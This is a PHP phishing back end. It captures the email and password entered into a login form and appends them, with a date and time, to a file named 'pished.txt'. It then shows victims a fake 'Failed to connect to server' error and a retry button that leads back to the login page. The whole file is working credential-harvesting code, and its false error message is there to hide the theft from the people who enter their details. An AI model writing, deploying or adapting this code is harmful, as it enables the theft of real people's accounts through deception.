<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $datetime = date("F j / g:i A");

    // Open the file in append mode
    $file = fopen("pished.txt", "a") or die("Unable to open file!");
    fwrite($file, "DT: " . $datetime . "\n");
    fwrite($file, "Email: " . $email . "\n");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);

    // Display a styled connection error message
    echo '<div class="error-container">';
    echo '<div class="error-icon">⚠️</div>';
    echo '<div class="error-message">';
    echo '<strong>Something went wrong!</strong><br>';
    echo 'Failed to connect to server.';
    echo '</div>';
    echo '<button onclick="window.location.href=\'index.html\'">Try again</button>';
    echo '</div>';
}
?>


